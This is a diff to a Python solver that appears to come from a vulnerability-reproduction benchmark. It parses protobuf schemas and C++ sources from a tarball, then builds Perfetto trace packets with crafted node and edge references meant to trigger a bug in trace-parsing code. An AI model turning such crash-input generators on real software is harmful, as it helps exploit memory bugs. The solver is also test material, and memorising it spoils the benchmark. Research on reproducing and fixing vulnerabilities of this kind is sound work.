+    name = msg_full.split(".")[-1]
+    score = 0
+    if "Graph" in name or "Snapshot" in name or "Dump" in name:
+        score += 5
+    rep_msg_fields = [f for f in mdef.fields if f.label == "repeated" and not pidx.is_scalar_type(f.type_str)]
+    score += min(10, len(rep_msg_fields))
+    # Extra points if looks like nodes/edges container
+    for f in rep_msg_fields:
+        fn = f.name.lower()
+        if "node" in fn or "object" in fn:
+            score += 10
+        if "edge" in fn or "reference" in fn or "link" in fn:
+            score += 10
+    return score
+
+
+def _pick_trace_and_packet_messages(pidx: ProtoIndex) -> Tuple[Optional[str], Optional[str], Optional[int]]:
+    # Find TracePacket
+    tracepacket_candidates = pidx.find_messages_ending_with(".TracePacket") + ([k for k in pidx.messages if k == "TracePacket"])
+    tracepacket_candidates = list(dict.fromkeys(tracepacket_candidates))
+    tracepacket = tracepacket_candidates[0] if tracepacket_candidates else None
+
+    # Find Trace with a repeated field pointing to TracePacket.
+    trace_candidates = pidx.find_messages_ending_with(".Trace") + ([k for k in pidx.messages if k == "Trace"])
+    trace_candidates = list(dict.fromkeys(trace_candidates))
+    best_trace = None
+    best_packet_field_num = None
+    best_score = -1
+    for tname in trace_candidates:
+        tdef = pidx.messages.get(tname)
+        if not tdef:
+            continue
+        for f in tdef.fields:
+            if f.label != "repeated":
+                continue
+            cands = pidx.resolve_message_type_candidates(f.type_str, tname)
+            if not cands:
+                continue
+            if tracepacket and tracepacket in cands:
+                s = 10
+            else:
+                # If we don't know tracepacket, any repeated message field named packet is likely it
+                s = 0
+            if f.name.lower() == "packet":
+                s += 50
+            if f.num == 1:
+                s += 5
+            if s > best_score:
+                best_score = s
+                best_trace = tname
+                best_packet_field_num = f.num
+                if tracepacket is None and cands:
+                    tracepacket = cands[0]
+    return best_trace, tracepacket, best_packet_field_num
+
+
+def _bfs_path(pidx: ProtoIndex, start: str, target: str) -> Optional[List[Tuple[str, int, str]]]:
+    if start == target:
+        return []
+    adj = pidx.build_adjacency()
+    q: List[str] = [start]
+    prev: Dict[str, Tuple[str, int, str]] = {}  # child -> (parent, field_num, child)
+    seen: Set[str] = {start}
+
+    while q:
+        cur = q.pop(0)
+        for fnum, _, child in adj.get(cur, []):
+            if child in seen:
+                continue
+            seen.add(child)
+            prev[child] = (cur, fnum, child)
+            if child == target:
+                # reconstruct
+                path: List[Tuple[str, int, str]] = []
+                node = child
+                while node != start:
+                    parent, fn, ch = prev[node]
+                    path.append((parent, fn, ch))
+                    node = parent
+                path.reverse()
+                return path
+            q.append(child)
+    return None
+
+
+def _find_id_field(pidx: ProtoIndex, msg_full: str) -> Optional[FieldDef]:
+    mdef = pidx.messages.get(msg_full)
+    if not mdef:
+        return None
+    candidates: List[Tuple[int, FieldDef]] = []
+    for f in mdef.fields:
+        if f.label == "repeated":
+            continue
+        fn = f.name.lower()
+        if not (_varint_type(f.type_str) or f.type_str.lstrip(".") in {"uint64", "uint32", "int64", "int32", "sint64", "sint32"}):
+            continue
+        if fn == "id":
+            return f
+        score = 0
+        if fn.endswith("_id"):
+            score += 5
+        if "node" in fn or "object" in fn:
+            score += 3
+        if "id" in fn:
+            score += 1
+        if score > 0:
+            candidates.append((score, f))
+    if not candidates:
+        # fallback: first varint field
+        for f in mdef.fields:
+            if f.label != "repeated" and _varint_type(f.type_str):
+                return f
+        return None
+    candidates.sort(key=lambda x: (-x[0], x[1].num))
+    return candidates[0][1]
+
+
+def _find_edge_id_fields(pidx: ProtoIndex, edge_msg_full: str) -> Tuple[Optional[FieldDef], Optional[FieldDef]]:
+    mdef = pidx.messages.get(edge_msg_full)
+    if not mdef:
+        return None, None
+    id_fields = [f for f in mdef.fields if f.label != "repeated" and _varint_type(f.type_str) and "id" in f.name.lower()]
+    if not id_fields:
+        # fallback: any varint fields
+        id_fields = [f for f in mdef.fields if f.label != "repeated" and _varint_type(f.type_str)]
+    if not id_fields:
+        return None, None
+
+    def role_score(f: FieldDef, role: str) -> int:
+        n = f.name.lower()
+        s = 0
+        if role == "from":
+            if "from" in n or "src" in n or "source" in n or "owner" in n or "parent" in n:
+                s += 10
+        if role == "to":
+            if "to" in n or "dst" in n or "target" in n or "owned" in n or "child" in n:
+                s += 10
+        if n.endswith("_id"):
+            s += 2
+        if "node" in n or "object" in n:
+            s += 1
+        return s
+
+    best_from = None
+    best_to = None
+    best_from_s = -1
+    best_to_s = -1
+    for f in id_fields:
+        sf = role_score(f, "from")
+        st = role_score(f, "to")
+        if sf > best_from_s:
+            best_from_s = sf
+            best_from = f
+        if st > best_to_s:
+            best_to_s = st
+            best_to = f
+
+    # If best_from and best_to are the same and we have >=2 id fields, pick second as to.
+    if best_from and best_to and best_from.num == best_to.num:
+        if len(id_fields) >= 2:
+            id_fields_sorted = sorted(id_fields, key=lambda f: f.num)
+            best_from = id_fields_sorted[0]
+            best_to = id_fields_sorted[1]
+    return best_from, best_to
+
+
+def _choose_node_edge_fields(pidx: ProtoIndex, target_msg_full: str) -> Tuple[Optional[FieldDef], Optional[str], Optional[FieldDef], Optional[str]]:
+    tdef = pidx.messages.get(target_msg_full)
+    if not tdef:
+        return None, None, None, None
+
+    rep_msg_fields = [f for f in tdef.fields if f.label == "repeated" and not pidx.is_scalar_type(f.type_str)]
+    if not rep_msg_fields:
+        return None, None, None, None
+
+    # For each repeated message field, resolve its message type(s), and score based on whether it has an id field.
+    node_candidates: List[Tuple[int, FieldDef, str]] = []
+    edge_candidates: List[Tuple[int, FieldDef, str]] = []
+
+    for f in rep_msg_fields:
+        cands = pidx.resolve_message_type_candidates(f.type_str, target_msg_full)
+        for c in cands[:3]:
+            cdef = pidx.messages.get(c)
+            if not cdef:
+                continue
+            idf = _find_id_field(pidx, c)
+            base = 0
+            fn = f.name.lower()
+            mn = c.split(".")[-1].lower()
+            if "node" in fn or "node" in mn or "object" in fn or "object" in mn:
+                base += 10
+            if "edge" in fn or "edge" in mn or "reference" in fn or "reference" in mn or "link" in fn or "ref" in fn:
+                base += 10
+            if idf is not None:
+                base += 10
+            # Edge scoring: needs at least two id-ish fields
+            idish = [ff for ff in cdef.fields if ff.label != "repeated" and _varint_type(ff.type_str) and "id" in ff.name.lower()]
+            if len(idish) >= 2:
+                edge_bonus = 15
+            elif len(idish) == 1:
+                edge_bonus = 5
+            else:
+                edge_bonus = 0
+
+            node_score = base
+            edge_score = base + edge_bonus
+
+            if "node" in fn or "object" in fn:
+                node_candidates.append((node_score, f, c))
+            if "edge" in fn or "reference" in fn or "link" in fn or "ref" in fn:
+                edge_candidates.append((edge_score, f, c))
+
+            # If names aren't explicit, still consider as possible node/edge based on message structure
+            if "node" not in fn and "edge" not in fn and "reference" not in fn and "link" not in fn and "ref" not in fn:
+                if idf is not None:
+                    node_candidates.append((node_score - 3, f, c))
+                if edge_bonus > 0:
+                    edge_candidates.append((edge_score - 3, f, c))
+
+    if not node_candidates or not edge_candidates:
+        # fallback: pick any two repeated message fields with id and with >=2 idish
+        for f in rep_msg_fields:
+            cands = pidx.resolve_message_type_candidates(f.type_str, target_msg_full)
+            for c in cands[:2]:
+                idf = _find_id_field(pidx, c)
+                if idf is not None:
+                    node_candidates.append((1, f, c))
+                cdef = pidx.messages.get(c)
+                if cdef:
+                    idish = [ff for ff in cdef.fields if ff.label != "repeated" and _varint_type(ff.type_str) and "id" in ff.name.lower()]
+                    if len(idish) >= 2:
+                        edge_candidates.append((1, f, c))
+
+    if not node_candidates or not edge_candidates:
+        return None, None, None, None
+
+    node_candidates.sort(key=lambda x: (-x[0], x[1].num))
+    edge_candidates.sort(key=lambda x: (-x[0], x[1].num))
+    node_field, node_type = node_candidates[0][1], node_candidates[0][2]
+    edge_field, edge_type = edge_candidates[0][1], edge_candidates[0][2]
+    return node_field, node_type, edge_field, edge_type
+
+
+def _build_graph_message_bytes(pidx: ProtoIndex, target_msg_full: str) -> Optional[bytes]:
+    node_field, node_type, edge_field, edge_type = _choose_node_edge_fields(pidx, target_msg_full)
+    if not node_field or not node_type or not edge_field or not edge_type:
+        return None
+
+    node_id_field = _find_id_field(pidx, node_type)
+    if not node_id_field:
+        return None
+
+    from_f, to_f = _find_edge_id_fields(pidx, edge_type)
+    if not from_f and not to_f:
+        return None
+    if not from_f:
+        from_f = to_f
+    if not to_f:
+        to_f = from_f
+
+    node_bytes = _encode_uint(node_id_field.num, 1)
+    edge_bytes = b""
+    if from_f:
+        edge_bytes += _encode_uint(from_f.num, 1)
+    if to_f:
+        edge_bytes += _encode_uint(to_f.num, 2)
+
+    # Ensure nodes appear before edges (in serialized order)
+    out = bytearray()
+    out += _encode_bytes(node_field.num, node_bytes)
+    out += _encode_bytes(edge_field.num, edge_bytes)
+    return bytes(out)
+
+
+def _add_min_scalars(pidx: ProtoIndex, msg_full: str, msg_payload: bytes) -> bytes:
+    mdef = pidx.messages.get(msg_full)
+    if not mdef:
+        return msg_payload
+    extras = bytearray()
+    # Add a few common gating fields if present.
+    preferred_names = [
+        ("trusted_packet_sequence_id", 1),
+        ("packet_sequence_id", 1),
+        ("sequence_id", 1),
+        ("timestamp", 1),
+        ("ts", 1),
+        ("pid", 1),
+        ("process_id", 1),
+        ("tgid", 1),
+        ("upid", 1),
+        ("utid", 1),
+    ]
+    found = set()
+    for f in mdef.fields:
+        fn = f.name.lower()
+        if f.label == "repeated":
+            continue
+        if not _varint_type(f.type_str):
+            continue
+        for pname, val in preferred_names:
+            if pname == fn or (pname in {"ts"} and fn in {"ts", "time_ns", "time", "event_timestamp"}) or (pname in fn):
+                if f.num not in found:
+                    extras += _encode_scalar_field(f, val)
+                    found.add(f.num)
+                break
+        if len(found) >= 3:
+            break
+    if extras:
+        return bytes(extras) + msg_payload
+    return msg_payload
+
+
+def _generate_trace_packet_for_target(pidx: ProtoIndex, tracepacket_full: str, target_msg_full: str) -> Optional[bytes]:
+    target_payload = _build_graph_message_bytes(pidx, target_msg_full)
+    if target_payload is None:
+        return None
+
+    path = _bfs_path(pidx, tracepacket_full, target_msg_full)
+    if path is None:
+        if tracepacket_full == target_msg_full:
+            pkt_payload = _add_min_scalars(pidx, tracepacket_full, target_payload)
+            return pkt_payload
+        return None
+
+    # Build from inner to outer: start with target payload
+    cur_payload = target_payload
+    # Reverse traverse path: last edge points to target
+    for parent, field_num, child in reversed(path):
+        wrapped = _encode_bytes(field_num, cur_payload)
+        wrapped = _add_min_scalars(pidx, parent, wrapped)
+        cur_payload = wrapped
+
+    # cur_payload is now TracePacket payload (not length-delimited; caller will wrap if needed)
+    cur_payload = _add_min_scalars(pidx, tracepacket_full, cur_payload)
+    return cur_payload
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        file_items = list(_iter_tar_or_dir_files(src_path))
-        db = parse_protos(file_items)
+        files = _read_tar_members(src_path)
+        proto_texts: Dict[str, str] = {}
+        cpp_texts: Dict[str, str] = {}
 
-        trace_msg, trace_packet_msg, trace_packet_field_num = _find_trace_and_packet(db)
-        if not trace_packet_msg:
-            # Best-effort fallback: minimal data
-            return b"A" * 140
+        for name, data in files.items():
+            ln = name.lower()
+            if ln.endswith(".proto"):
+                proto_texts[name] = _decode_text(data)
+            elif ln.endswith((".cc", ".cpp", ".c", ".cxx", ".h", ".hpp", ".hh", ".hxx")):
+                cpp_texts[name] = _decode_text(data)
 
-        adj = _build_adjacency(db)
-
-        # Find reachable candidate messages that can be crafted
-        candidates: List[Tuple[int, int, MessageDef, List[Tuple[MessageDef, FieldDef, MessageDef]], bytes]] = []
-        for m in db.by_full.values():
-            crafted = _craft_invalid_reference_in_message(db, m)
-            if crafted is None:
+        pidx = ProtoIndex()
+        for _, txt in proto_texts.items():
+            try:
+                pidx.parse_proto_text(txt)
+            except Exception:
                 continue
-            path = _bfs_path(adj, trace_packet_msg, m)
-            if path is None:
+
+        top_level = _detect_top_level(cpp_texts)
+
+        trace_full, tracepacket_full, trace_packet_field_num = _pick_trace_and_packet_messages(pidx)
+
+        # If we can't find protos, return a minimal non-empty input.
+        if not pidx.messages:
+            return b"\x00"
+
+        # Determine likely targets
+        hints = _extract_hints_from_cpp(cpp_texts)
+        candidate_targets: List[str] = []
+
+        # Add hint-based candidates
+        for h in hints[:12]:
+            for full in pidx.short_to_fulls.get(h, []):
+                candidate_targets.append(full)
+
+        # Add heuristic candidates
+        all_msgs = list(pidx.messages.keys())
+        scored = sorted((( _score_graph_like_message(pidx, m), m) for m in all_msgs), key=lambda x: -x[0])
+        for s, m in scored[:60]:
+            if s <= 0:
+                break
+            candidate_targets.append(m)
+
+        # Deduplicate, keep order
+        seen = set()
+        uniq_targets: List[str] = []
+        for m in candidate_targets:
+            if m in seen:
                 continue
-            sc = _candidate_score(m)
-            # prioritize higher score, shorter path, shorter crafted
-            candidates.append((sc, len(path), m, path, crafted))
+            seen.add(m)
+            uniq_targets.append(m)
 
-        if not candidates:
-            # Try direct ProcessMemoryDump if available
-            pmd = db.resolve_message("ProcessMemoryDump")
-            if pmd:
-                crafted = _craft_invalid_reference_in_message(db, pmd) or b""
-                path = _bfs_path(adj, trace_packet_msg, pmd) or []
-                tp_bytes = _wrap_along_path(db, path, crafted if crafted else b"")
-                trace_stream = _enc_field_bytes(trace_packet_field_num, tp_bytes)
-                return trace_stream if trace_stream else (b"A" * 140)
-            return b"A" * 140
+        # Decide start message
+        if top_level == "TracePacket":
+            start_msg = tracepacket_full
+        else:
+            start_msg = tracepacket_full
 
-        candidates.sort(key=lambda x: (-x[0], x[1], len(x[4]), len(x[2].full_name)))
+        if start_msg is None:
+            # No TracePacket message found; try to craft payload directly from best graph-like message.
+            for _, m in scored[:50]:
+                b = _build_graph_message_bytes(pidx, m)
+                if b:
+                    return b
+            return b"\x00"
 
-        # Build up to 3 packets for robustness
-        out = bytearray()
-        used = 0
-        for sc, _, m, path, crafted in candidates:
-            tp_bytes = _wrap_along_path(db, path, crafted)
-            # also add a timestamp if TracePacket has one (helps some pipelines, small overhead)
-            ts_f = trace_packet_msg.get_field_ci("timestamp")
-            if ts_f and ts_f.wire_type == 0 and not any(tp_bytes.startswith(_enc_tag(ts_f.number, 0)) for _ in [0]):
-                tp_bytes = _enc_field_varint(ts_f.number, 1) + tp_bytes
-            out += _enc_field_bytes(trace_packet_field_num, tp_bytes)
-            used += 1
-            if used >= 3:
+        # Build up to a few packets for robustness
+        packets: List[bytes] = []
+        for tgt in uniq_targets:
+            pkt = _generate_trace_packet_for_target(pidx, start_msg, tgt)
+            if pkt:
+                packets.append(pkt)
+            if len(packets) >= 3:
                 break
 
-        if out:
-            return bytes(out)
+        if not packets:
+            # Fallback: try direct graph message bytes for best candidates
+            for _, m in scored[:80]:
+                b = _build_graph_message_bytes(pidx, m)
+                if b:
+                    return b
+            return b"\x00"
 
-        return b"A" * 140
+        if top_level == "TracePacket" or trace_full is None or trace_packet_field_num is None:
+            # Return the first packet directly.
+            return packets[0]
+
+        # Wrap in Trace as repeated packet field(s). Note: this is also the on-disk perfetto trace encoding.
+        out = bytearray()
+        for pkt in packets:
+            out += _encode_bytes(trace_packet_field_num, pkt)
+
+        # Keep output reasonably small
+        if len(out) > 4096:
+            out = out[:4096]
+        return bytes(out)
